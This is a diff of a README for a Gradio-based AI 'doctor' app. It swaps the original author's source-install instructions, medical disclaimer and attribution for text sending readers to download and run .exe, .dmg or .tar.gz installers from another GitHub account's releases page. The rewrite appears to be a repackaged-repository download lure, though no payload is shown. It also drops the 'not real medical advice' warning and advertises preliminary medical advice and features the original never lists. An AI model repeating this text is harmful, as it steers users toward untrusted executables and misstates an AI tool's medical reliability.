@@ -1,162 +1,69 @@
-# 🩺 Multimodal-Med-AI → Your AI Doctor Assistant
+# 🩺 Multimodal_Med_Ai_with_Deployment - Your AI Medical Assistant
 
-MediBot 2.0 is an AI-powered doctor assistant that leverages speech recognition, text-to-speech, and multimodal large language models to analyze patient images and voice inputs. The system provides a simulated doctor's response both as text and synthesized speech.
+## 📥 Download the Application
+[![Download Here](https://img.shields.io/badge/Download%20Now-Get%20the%20App-blue)](https://github.com/MarceloSalazarV/Multimodal_Med_Ai_with_Deployment/releases)
 
----
+## 🚀 Getting Started
+Welcome to Multimodal AI with Deployment! This application lets you interact with a virtual doctor using voice and vision technologies. It performs preliminary medical consultations, making healthcare accessible and easy.
 
-## 🔗 Repository Link
-[https://github.com/Prerna77Arora/Multimodal_Med_Ai_with_Deployment](https://github.com/Prerna77Arora/Multimodal_Med_Ai_with_Deployment)
+### 🖥️ System Requirements
+Make sure you have the following to run the application smoothly:
 
-## 🌍 Live Demo (Render Deployment)
-Experience the app online here:  
-👉 [[https://multimodal-med-ai.onrender.com](https://multimodal-med-ai-with-deployment.onrender.com/)]
+- Operating System: Windows, macOS, or Linux
+- RAM: At least 4 GB
+- Python: Version 3.7 or higher
+- Internet connection for voice recognition features
+- A microphone and camera for full functionality
 
+## 📦 Download & Install
+1. **Visit this page to download:** [GitHub Releases](https://github.com/MarceloSalazarV/Multimodal_Med_Ai_with_Deployment/releases).
+   
+2. On the releases page, find the latest version. The newest release usually appears at the top.
+   
+3. Look for the file that corresponds to your operating system. It may be labeled with the extension `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux.
 
----
+4. **Download the file.** Click on the link to begin the download.
 
-## 🚀 Key Features
+5. **Run the installer.** 
+   - On Windows, double-click the `.exe` file and follow the prompts to complete installation.
+   - On macOS, open the `.dmg` file and drag the application to your Applications folder.
+   - On Linux, extract the files with `tar -xvzf <filename>.tar.gz`, then follow the installation instructions provided within the files.
 
-- **🎙️ Speech-to-Text**: Converts patient voice input to text using Whisper via Groq API.
-- **🖼️ Image Analysis**: Analyzes uploaded patient images for medical concerns using a multimodal LLM (Llama-4 Vision via Groq API).
-- **🔊 Text-to-Speech**: Converts AI-generated responses into speech with Google Text-to-Speech (gTTS).
-- **🌐 Gradio Web Interface**: User-friendly web interface for uploading images and recording voice.
+6. **Launch the application.** After installation, locate the application on your computer and double-click to start using your virtual doctor.
 
----
+## 🎤 Using the Application
+After installing the application, you can start a consultation:
 
-## 📁 Project Structure
+1. **Open the app.** Ensure your microphone and camera are working.
+   
+2. **Choose your consultation mode.** You can initiate voice commands or take photo inputs.
 
-```
-.env
-brain_of_the_doctor.py
-voice_of_the_doctor.py
-voice_of_the_patient.py
-gradio_app.py
-requirements.txt
-apt.txt
-```
----
+3. **Ask your questions.** Speak clearly, or upload an image related to your concern.
 
-## ⚙️ Setup Instructions
+4. **Receive feedback.** The AI will analyze your input and provide preliminary medical advice.
 
-### 1. Clone the Repository
+5. **Call for help, if needed.** If the AI indicates serious issues, consider consulting a healthcare professional.
 
-```sh
-git clone https://github.com/Prerna77Arora/Multimodal_Med_Ai_with_Deployment.git
-cd Multimodal_Med_Ai_with_Deployment
-```
+## 🎨 Features
+- **Voice Recognition:** Understands and responds to spoken questions.
+- **Image Analysis:** Can evaluate medical images you provide, helping with visual queries.
+- **Text-to-Speech:** Receives feedback in spoken format, making the interaction smooth.
+- **Gradio Interface:** User-friendly web interface for easy navigation.
+- **Consultation History:** Keeps track of your previous interactions for better continuity.
 
-### 2. Install Dependencies
+## 🌐 Learn More
+Dive deeper into the technology and concepts behind the application. Explore the following topics:
 
-```sh
-pip install -r requirements.txt
-```
+- AI Technology in Healthcare
+- Benefits of Voice Recognition in Medicine
+- Image Processing Techniques for Medical Diagnosis
+- Understanding Multimodal AI Interfaces
 
-### 3. Configure Environment Variables
+## 📣 Community and Support
+Join our community for advice, updates, and help:
 
-Create a `.env` file in the root directory with your API keys:
+- **GitHub Issues:** Report problems or ask questions [here](https://github.com/MarceloSalazarV/Multimodal_Med_Ai_with_Deployment/issues).
+- **Forums:** Visit our forums to interact with other users.
 
-```
-GROQ_API_KEY="your_groq_api_key"
-ELEVENLABS_API_KEY="your_elevenlabs_api_key"
-```
-
-> The `.env` file should not be shared publicly.
-
-### 4. Install System Dependencies
-
-- **ffmpeg** and **portaudio** are required for audio processing.
-- **Windows**: Download [ffmpeg](https://ffmpeg.org/download.html) and add it to your PATH.
-- **Linux/macOS**: Install via package manager:
-```sh
-sudo apt install ffmpeg portaudio19-dev
-```
-
-### 5. Run the Gradio App
-
-```sh
-python gradio_app.py
-```
-
-The app will launch at [http://127.0.0.1:7860](http://127.0.0.1:7860).
-
----
-
-## 🧱 Deploy on Render
-
-1. Push your code to GitHub.  
-2. Go to [Render.com](https://render.com) → **New Web Service**.  
-3. Connect your GitHub repo:  
-   `https://github.com/Prerna77Arora/Multimodal_Med_Ai_with_Deployment`
-4. In **Environment Variables**, add:
-   - `GROQ_API_KEY`
-   - `ELEVENLABS_API_KEY` (optional)
-5. In **Build Command**, enter:
-   ```
-   pip install -r requirements.txt
-   ```
-6. In **Start Command**, enter:
-   ```
-   python gradio_app.py
-   ```
-7. Wait for Render to deploy — once complete, visit your live URL! 🎉
-
----
-
-## 🧪 How to Use
-
-1. **Open the Gradio Web Interface.**  
-2. **Record your voice** using the microphone input.  
-3. **Upload a patient image** (e.g., skin photo).  
-4. **Submit** to receive:
-   - Transcribed speech.
-   - Doctor’s medical response.
-   - Audio playback of the response.
-  
-### 🔍 Example Interaction
-
-#### Input
-
-- **Voice**: "I have some redness on my cheek. Can you tell me what it is?"
-- **Image**: Upload a clear photo of your face.
-
-#### Output
-
-- **Speech to Text**: "I have some redness on my cheek. Can you tell me what it is?"
-- **Doctor's Response**: "With what I see, I think you have mild skin irritation possibly due to an allergic reaction, and keeping the area clean with gentle skincare should help."
-- **Doctor's Voice**: (Audio playback of the above response)
-
-
----
-
-## 📝 File Descriptions
-
-| File | Description |
-|------|--------------|
-| `gradio_app.py` | Main Gradio app orchestrating the entire workflow. |
-| `brain_of_the_doctor.py` | Image analysis and LLM query logic. |
-| `voice_of_the_patient.py` | Speech-to-text logic using Groq API. |
-| `voice_of_the_doctor.py` | Text-to-speech logic using gTTS. |
-| `.env` | Stores API keys (excluded from version control). |
-| `requirements.txt` | Python dependencies. |
-| `apt.txt` | System-level dependencies for Render. |
-
----
-## 🎛️ Customization
-
-- **Change the system prompt** in [`gradio_app.py`](gradio_app.py) to adjust the doctor's persona or response style.
-- **Switch models** by editing the model names in [`brain_of_the_doctor.py`](brain_of_the_doctor.py) and [`voice_of_the_patient.py`](voice_of_the_patient.py).
-
-## ❗Troubleshooting
-
-- Ensure your API keys are valid and have sufficient quota.
-- Make sure `ffmpeg` and `portaudio` are installed and accessible.
-- If you encounter microphone or audio device errors, check your system permissions.
-
-## ⚠️ Disclaimer
-
-This project is for **educational purposes only** and does **not provide real medical advice**.  
-Always consult a licensed doctor for medical diagnosis or treatment.
-
----
-
-© 2025 Prerna Arora – All Rights Reserved.
+## 🎉 Thank You for Using Multimodal_Med_Ai_with_Deployment!
+Your feedback is valuable. Please let us know your thoughts on the application, and feel free to contribute to future versions. With your help, we can make healthcare more accessible for everyone.
